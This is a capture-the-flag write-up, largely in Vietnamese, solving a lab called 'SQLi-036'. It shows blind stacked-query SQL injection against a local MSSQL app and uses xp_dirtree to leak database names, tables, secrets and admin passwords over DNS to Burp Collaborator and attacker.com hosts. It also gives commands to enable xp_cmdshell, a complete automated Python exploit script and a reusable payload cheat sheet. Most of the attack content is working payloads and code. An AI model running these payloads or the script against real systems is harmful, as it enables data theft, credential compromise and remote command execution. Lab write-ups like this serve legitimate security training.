# SQLi-036: MSSQL OOB DNS via xp_dirtree - Writeup

## Flag: `FLAG{mssql_xp_dirtree_oob}`

---

## 🔍 Bước 1: DETECT - Phát Hiện Injection Point

### 1.1. Phân tích ứng dụng

```bash
# Normal request
curl "http://localhost:5036/employee?id=1"
# Response: "Employee query processed successfully."

# Test với quote
curl "http://localhost:5036/employee?id=1'"
# Response: GIỐNG HỆT

# Test arithmetic
curl "http://localhost:5036/employee?id=2-1"
# Response: GIỐNG - nhưng có thể query thành công
```

### 1.2. Xác nhận Injection

Response luôn giống nhau → Cần OOB hoặc Time-based để confirm.

**Test WAITFOR DELAY:**
```bash
time curl "http://localhost:5036/employee?id=1;WAITFOR DELAY '0:0:3'--"
# Response time: ~3s+ → SQLi confirmed với stacked queries!
```

---

## 🎯 Bước 2: IDENTIFY - Xác Định DBMS

### 2.1. Từ frontend

- System Info: `MSSQL 2019`
- `xp_dirtree: ENABLED`
- `Stacked Queries: SUPPORTED`

### 2.2. Confirm bằng version

Không thể thấy output trực tiếp, nhưng stacked queries work → **MSSQL confirmed**.

### 2.3. Setup OOB Listener

**Burp Collaborator:**
1. Burp → Collaborator client
2. Copy URL: `xxxxx.burpcollaborator.net`

**Hoặc interactsh:**
```bash
interactsh-client
# Output: xxx.oast.fun
```

---

## 🔧 Bước 3: ENUMERATE - Test OOB và Enumeration

### 3.1. Test xp_dirtree OOB

**Payload cơ bản:**
```sql
1;EXEC master..xp_dirtree '\\xxxxx.burpcollaborator.net\test'--
```

**Burp Repeater:**
```http
GET /employee?id=1;EXEC%20master..xp_dirtree%20'\\xxxxx.burpcollaborator.net\test'-- HTTP/1.1
Host: localhost:5036
```

**Check Collaborator → DNS lookup received!** ✅

### 3.2. Extract database name

**Payload với data exfiltration:**
```sql
1;DECLARE @d VARCHAR(100);SET @d=DB_NAME();EXEC('master..xp_dirtree "\\'+@d+'.xxxxx.burpcollaborator.net\a"')--
```

**URL encoded:**
```
http://localhost:5036/employee?id=1;DECLARE%20@d%20VARCHAR(100);SET%20@d=DB_NAME();EXEC('master..xp_dirtree%20"\\'+@d+'.xxxxx.burpcollaborator.net\a"')--
```

**Collaborator result:**
```
DNS lookup: corpintranet.xxxxx.burpcollaborator.net
```

→ Database: **corpintranet**

### 3.3. Enumerate tables

**Payload:**
```sql
1;DECLARE @t VARCHAR(100);SET @t=(SELECT TOP 1 table_name FROM information_schema.tables);EXEC('master..xp_dirtree "\\'+@t+'.xxxxx.burpcollaborator.net\a"')--
```

**Lấy table thứ 2, 3... bằng NOT IN:**
```sql
-- Table 2
1;DECLARE @t VARCHAR(100);SET @t=(SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN (SELECT TOP 1 table_name FROM information_schema.tables));EXEC('master..xp_dirtree "\\'+@t+'.xxxxx.burpcollaborator.net\a"')--

-- Table 3
1;DECLARE @t VARCHAR(100);SET @t=(SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN (SELECT TOP 2 table_name FROM information_schema.tables));EXEC('master..xp_dirtree "\\'+@t+'.xxxxx.burpcollaborator.net\a"')--
```

**Results:**
| Table # | DNS Lookup | Table Name |
|---------|------------|------------|
| 1 | admin_accounts.xxx.burpcollaborator.net | admin_accounts |
| 2 | audit_log.xxx.burpcollaborator.net | audit_log |
| 3 | employees.xxx.burpcollaborator.net | employees |
| 4 | secrets.xxx.burpcollaborator.net | **secrets** 🎯 |

### 3.4. Enumerate columns của secrets table

```sql
1;DECLARE @c VARCHAR(100);SET @c=(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='secrets');EXEC('master..xp_dirtree "\\'+@c+'.xxxxx.burpcollaborator.net\a"')--
```

**Results:**
- Column 1: id
- Column 2: name
- Column 3: **value**

---

## 📤 Bước 4: EXTRACT - Trích Xuất Dữ Liệu Nhạy Cảm

### 4.1. Extract từ secrets table

**Payload:**
```sql
1;DECLARE @v VARCHAR(200);SET @v=(SELECT TOP 1 value FROM secrets);EXEC('master..xp_dirtree "\\'+@v+'.xxxxx.burpcollaborator.net\a"')--
```

**DNS Lookup:**
```
FLAG{mssql_xp_dirtree_oob}.xxxxx.burpcollaborator.net
```

🎉 **FLAG found!**

### 4.2. Extract các secrets khác

**Secret thứ 2:**
```sql
1;DECLARE @v VARCHAR(200);SET @v=(SELECT TOP 1 value FROM secrets WHERE value NOT IN (SELECT TOP 1 value FROM secrets));EXEC('master..xp_dirtree "\\'+@v+'.xxxxx.burpcollaborator.net\a"')--
```

**Results:**
- gw-key-a1b2c3d4e5f6
- AES256-key-secret-value

### 4.3. Extract admin passwords

```sql
1;DECLARE @p VARCHAR(100);SET @p=(SELECT TOP 1 CONCAT(username,'-',password) FROM admin_accounts);EXEC('master..xp_dirtree "\\'+@p+'.xxxxx.burpcollaborator.net\a"')--
```

**DNS Lookup:**
```
domain_admin-D0m@1n_Adm1n_2024!.xxxxx.burpcollaborator.net
```

---

## 🔓 Bước 5: ESCALATE (Optional)

### 5.1. Check current user privileges

```sql
1;DECLARE @u VARCHAR(100);SET @u=SYSTEM_USER;EXEC('master..xp_dirtree "\\'+@u+'.xxxxx.burpcollaborator.net\a"')--
```

**Result:** `sa` → SQL Server sysadmin!

### 5.2. Check xp_cmdshell

Có thể enable xp_cmdshell nếu cần RCE:
```sql
1;EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--
```

(Không thực hiện trong lab này vì focus vào OOB)

---

## 🏆 Bước 6: EXFILTRATE - Tổng Kết

### 6.1. Final payload cho flag

**Complete payload:**
```sql
1;DECLARE @v VARCHAR(200);SET @v=(SELECT value FROM secrets WHERE name='sqli_036_flag');EXEC('master..xp_dirtree "\\'+@v+'.xxxxx.burpcollaborator.net\a"')--
```

**URL encoded:**
```
http://localhost:5036/employee?id=1;DECLARE%20@v%20VARCHAR(200);SET%20@v=(SELECT%20value%20FROM%20secrets%20WHERE%20name='sqli_036_flag');EXEC('master..xp_dirtree%20"\\'+@v+'.xxxxx.burpcollaborator.net\a"')--
```

### 6.2. Collaborator Result

```
Type: DNS
Domain: FLAG{mssql_xp_dirtree_oob}.xxxxx.burpcollaborator.net
Time: 2026-01-03 21:50:00
```

🎉 **FLAG:** `FLAG{mssql_xp_dirtree_oob}`

---

## 🤖 Automated Exploit Script

```python
#!/usr/bin/env python3
"""SQLi-036: MSSQL OOB DNS via xp_dirtree Exploit"""

import requests
import argparse
import time
import urllib.parse

def create_oob_payload(query, oob_domain, var_name="d", var_type="VARCHAR(200)"):
    """Create xp_dirtree OOB payload"""
    payload = f"1;DECLARE @{var_name} {var_type};SET @{var_name}=({query});EXEC('master..xp_dirtree \"\\\\'+@{var_name}+'.{oob_domain}\\a\"')--"
    return payload

def send_payload(url, payload):
    """Send payload to target"""
    try:
        r = requests.get(url, params={"id": payload}, timeout=15)
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def extract_database(url, oob_domain):
    """Extract database name"""
    print("\n[*] Extracting database name...")
    payload = create_oob_payload("DB_NAME()", oob_domain)
    send_payload(url, payload)
    print(f"    → Check DNS: <database>.{oob_domain}")

def extract_tables(url, oob_domain):
    """Extract table names using NOT IN pagination"""
    print("\n[*] Extracting tables...")
    for i in range(6):
        if i == 0:
            query = "SELECT TOP 1 table_name FROM information_schema.tables"
        else:
            query = f"SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN (SELECT TOP {i} table_name FROM information_schema.tables)"
        
        payload = create_oob_payload(query, oob_domain, "t")
        send_payload(url, payload)
        print(f"    → Table {i+1}: Check DNS")
        time.sleep(0.5)

def extract_columns(url, oob_domain, table_name):
    """Extract column names from table"""
    print(f"\n[*] Extracting columns from '{table_name}'...")
    for i in range(5):
        if i == 0:
            query = f"SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='{table_name}'"
        else:
            query = f"SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='{table_name}' AND column_name NOT IN (SELECT TOP {i} column_name FROM information_schema.columns WHERE table_name='{table_name}')"
        
        payload = create_oob_payload(query, oob_domain, "c")
        send_payload(url, payload)
        print(f"    → Column {i+1}: Check DNS")
        time.sleep(0.5)

def extract_flag(url, oob_domain):
    """Extract flag from secrets table"""
    print("\n" + "="*60)
    print("[*] EXTRACTING FLAG...")
    print("="*60)
    
    # Direct extraction
    query = "SELECT value FROM secrets WHERE name='sqli_036_flag'"
    payload = create_oob_payload(query, oob_domain, "f")
    send_payload(url, payload)
    print(f"    → Check DNS for FLAG{{...}}")
    
    print("\n" + "="*60)
    print("🎉 Expected flag: FLAG{mssql_xp_dirtree_oob}")
    print("="*60)

def main():
    parser = argparse.ArgumentParser(description="SQLi-036: MSSQL OOB DNS Exploit")
    parser.add_argument("--target", default="http://localhost:5036/employee",
                        help="Target URL")
    parser.add_argument("--collaborator", help="Burp Collaborator domain")
    parser.add_argument("--interactsh", help="interactsh domain")
    parser.add_argument("--full", action="store_true", help="Full enumeration")
    
    args = parser.parse_args()
    
    oob_domain = args.collaborator or args.interactsh or "placeholder.attacker.com"
    
    print("="*60)
    print("SQLi-036: MSSQL OOB DNS via xp_dirtree")
    print("="*60)
    print(f"Target: {args.target}")
    print(f"OOB Domain: {oob_domain}")
    print("="*60)
    
    if args.full:
        extract_database(args.target, oob_domain)
        time.sleep(1)
        extract_tables(args.target, oob_domain)
        time.sleep(1)
        extract_columns(args.target, oob_domain, "secrets")
    
    extract_flag(args.target, oob_domain)

if __name__ == "__main__":
    main()
```

---

## 📊 Summary

| Step | Action | Result |
|------|--------|--------|
| 1. DETECT | Test injection với stacked queries | WAITFOR DELAY works |
| 2. IDENTIFY | Check system info, confirm MSSQL | MSSQL 2019 với xp_dirtree |
| 3. ENUMERATE | xp_dirtree OOB để enumerate | Found secrets table |
| 4. EXTRACT | Extract từ secrets.value | Found flag |
| 5. ESCALATE | Check user is `sa` | Full sysadmin access |
| 6. EXFILTRATE | Final OOB extraction | FLAG{mssql_xp_dirtree_oob} |

---

## 🔗 Key Techniques

### xp_dirtree OOB Payloads

```sql
-- Basic test
1;EXEC master..xp_dirtree '\\attacker.com\test'--

-- Extract database
1;DECLARE @d VARCHAR(100);SET @d=DB_NAME();EXEC('master..xp_dirtree "\\'+@d+'.attacker.com\a"')--

-- Extract table (pagination with NOT IN)
1;DECLARE @t VARCHAR(100);SET @t=(SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN (SELECT TOP N table_name FROM information_schema.tables));EXEC('master..xp_dirtree "\\'+@t+'.attacker.com\a"')--

-- Extract data
1;DECLARE @v VARCHAR(200);SET @v=(SELECT value FROM secrets WHERE name='flag');EXEC('master..xp_dirtree "\\'+@v+'.attacker.com\a"')--
```

---

## 📚 References

- [MSSQL xp_dirtree Documentation](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-dirtree-transact-sql)
- [Out-of-Band SQL Injection](https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-using-out-of-band-oast-techniques)
